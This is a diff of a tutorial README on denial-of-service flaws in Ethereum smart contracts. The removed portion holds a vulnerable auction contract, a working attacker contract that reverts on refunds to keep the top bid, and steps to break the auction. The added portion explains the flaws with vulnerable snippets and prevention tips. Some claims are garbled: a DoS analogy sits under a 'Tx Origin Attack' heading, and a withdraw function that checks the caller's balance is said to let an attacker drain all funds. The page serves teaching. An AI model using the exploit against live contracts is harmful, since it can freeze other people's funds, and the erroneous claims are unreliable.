@@ -1,75 +1,89 @@
-# What is DOS Attack?
- DoS is short for Denial of Service. Any interference with a Service that reduces or loses its availability is called a Denial of Service. Simply put, normal service requests that a user needs cannot be processed by the system. For example, when a computer system crashes or its bandwidth is exhausted or its hard disk is filled up so that it cannot provide normal service, it constitutes a DoS. In this implementaiton we have a contract called auciton which is vulnerable to DoS attack. 
+### Denial of Service (DoS) in Ethereum Smart Contracts
 
-```solidity 
- // SPDX-License-Identifier: MIT
-pragma solidity 0.8.17;
-// Denial of service attack, an attack can make fail line 13 by a fallback function that always fails and thus achieve "Denial of service"
-// to keep his bidding position
+#### Overview
 
-// INSECURE
-contract Auction {
-    address payable public currentLeader;
-    uint public highestBid;
+Denial of Service (DoS) attacks in Ethereum smart contracts can be devastating, as they can render a contract permanently unusable or block access to critical functions. In traditional computing, a DoS attack might temporarily disrupt a service, but in the blockchain world, the effects can be irreversible, especially if the contract is taken offline or if essential functions are permanently blocked. These attacks can be carried out in various ways, including by exploiting gas limits, forcing reverts, abusing access controls, or taking advantage of contract design flaws.
 
-    function bid() payable external {
-        require(msg.value > highestBid);
+#### Real-World Impact
 
-        require(currentLeader.send(highestBid)); // Refund the old leader, if it fails then revert
+1. **GovernMental**: A lottery-like game that became unusable when a jackpot payout was stuck due to a DoS condition, preventing any further payouts or participation.
+2. **Parity Multi-Sig Wallet**: A critical vulnerability allowed anyone to become the owner of the library contract, leading to a call to `selfdestruct`, which effectively locked up 514,874 ETH (around $300M at the time) forever.
 
-        currentLeader = payable(msg.sender);
-        highestBid = msg.value;
-    }
-}
+#### Types of DoS Attacks and Examples
+
+1. **Gas Limit Reached**: 
+   - Ethereum imposes a block gas limit, which caps the total amount of gas that can be consumed by all transactions in a single block. Attackers can exploit this by triggering functions that require more gas than the limit allows, effectively blocking their execution.
+
+   **Example**:
+   ```solidity
+   function selectNextWinners(uint256 _largestWinner) {
+       for (uint256 i = 0; i < _largestWinner; i++) {
+           // complex logic that consumes a lot of gas
+       }
+       largestWinner = _largestWinner;
+   }
+   ```
+   - **Attack**: An attacker passes a very large value for `_largestWinner`, causing the loop to consume more gas than the block limit, effectively preventing the function from executing.
+
+2. **Unexpected Throw**:
+   - If a contract function relies on external calls that may fail, and these failures are not properly handled, it can cause the entire function to revert, blocking subsequent executions.
+
+   **Example**:
+   ```solidity
+   function becomePresident() public payable {
+       require(msg.value >= price); // Must pay the price to become president
+       president.transfer(price);   // Pay the previous president
+       president = msg.sender;      // Assign the new president
+       price = price * 2;           // Double the price for the next president
+   }
+   ```
+   - **Attack**: If the `president` is a smart contract that deliberately fails the transfer (e.g., by not having a payable fallback function or by reverting on receipt), the `becomePresident` function will revert, and the presidency cannot be transferred.
+
+3. **Unexpected Kill**:
+   - Contracts can be permanently disabled if a function allows an attacker to trigger the `selfdestruct` operation, which can remove the contract code from the blockchain and render it non-functional.
+
+   **Example**:
+   ```solidity
+   function destroyContract() public {
+       if (msg.sender == owner) {
+           selfdestruct(owner);
+       }
+   }
+   ```
+   - **Attack**: If the ownership control is weak or misconfigured, an attacker might gain ownership and call `selfdestruct`, permanently destroying the contract.
+
+4. **Access Control Breached**:
+   - Improper access control can allow unauthorized users to call sensitive functions, leading to DoS conditions. For instance, if a withdrawal function is accessible to anyone, an attacker could drain the contract or lock the funds, making it impossible for legitimate users to interact with it.
+
+   **Example**:
+   ```solidity
+   function withdraw(uint256 _amount) public {
+       require(balances[msg.sender] >= _amount);
+       balances[msg.sender] -= _amount;
+       msg.sender.transfer(_amount);
+   }
+   ```
+   - **Attack**: If `withdraw()` does not correctly restrict access, an attacker could repeatedly call it and withdraw all funds, disrupting the contract's intended functionality.
+
+#### Prevention
+
+1. **Gas Optimization**:
+   - Avoid loops or other operations that might consume excessive gas. Use off-chain calculations when possible and design functions to be as gas-efficient as possible.
+
+2. **Check for Call Failures**:
+   - Always check the return values of external calls and handle them appropriately to avoid unexpected reverts.
+
+3. **Access Control Mechanisms**:
+   - Implement strict access control using `onlyOwner` or similar modifiers. Use multi-signature wallets for critical functions to prevent unauthorized access.
+
+4. **Fail-Safe Design**:
+   - Design contracts with safety in mind. Ensure that critical functions cannot be easily manipulated to cause a DoS and that fallback mechanisms exist to recover from potential attacks.
 
 
-``` 
 
 
-And there is a attacker contact which  actually takes the smart contract address as the highest bidder and recursively call the function. 
 
-```Solidity
-// SPDX-License-Identifier: MIT
-pragma solidity 0.8.17;
+**Additional Resources**:
 
-interface Iauction{
-        function bid() payable external;
-}
-
-contract attackt004{
-         address public owner;
-         Iauction public immutable auc;
-
-        constructor (address  addr){
-            auc = Iauction(addr);
-            owner = msg.sender;
-         }
-
-        function attack() external payable {
-            auc.bid{value: msg.value}();
-        }
-
-        receive() external payable {
-                      revert();
-        }                     
-}
-
-```
-
-# How does it happen?
-In Solidity, a DoS vulnerability can be simply understood as “unrecoverable malicious manipulation or uncontrolled unlimited resource consumption”, i.e. a DoS attack on an Ethereum contract that could result in massive consumption of Ether and Gas and, worse, render the original contract code logic unworkable.
-
-
- 
-
-# Example of Tx Origin Attack.
- For example, there are three checkout points in the supermarket. Normally, people queue up to pay by scanning the code at the checkout point. However, one day, there was an Internet problem, and all the customers at the checkout point failed to scan the code and pay. Or, when paying, customers deliberately make trouble, so that the following customers can not pay, which will also lead to the supermarket can not operate. We can see that there are internal ones, that can cause the DoS attacks
-
-# How to prevent?
- For external operation mapping or array loop, need to limit the length; For the owner operation, the non-uniqueness of the contract should be considered, and the whole business should not be paralyzed because of a certain permission account. Based on the external call progress state need to except the handling of function calls, without any harm in general internal function calls, if the call is a failure will be back, and the external call is uncertain, we don’t know what the external caller wants to do if being attacked by the attacker, it may cause serious consequences.
-
-# How to use our code: 
- - First you need to deploy the auction contract code in remix ide. 
- - Perform some biddign  and each time highest bidder will be changed.
- - Deploy the attack code putting the auction contact address as a parameter.
- - Then perform the bid using the attack  funciton from the attack file. Then the auction contract will be broken.  
+*   [Parity Multisig Hacked. Again](https://medium.com/chain-cloud-company-blog/parity-multisig-hack-again-b46771eaa838)
+*   [Statement on the Parity multi-sig wallet vulnerability and the Cappasity token crowdsale](https://blog.artoken.io/statement-on-the-parity-multi-sig-wallet-vulnerability-and-the-cappasity-artoken-crowdsale-b3a3fed2d567)
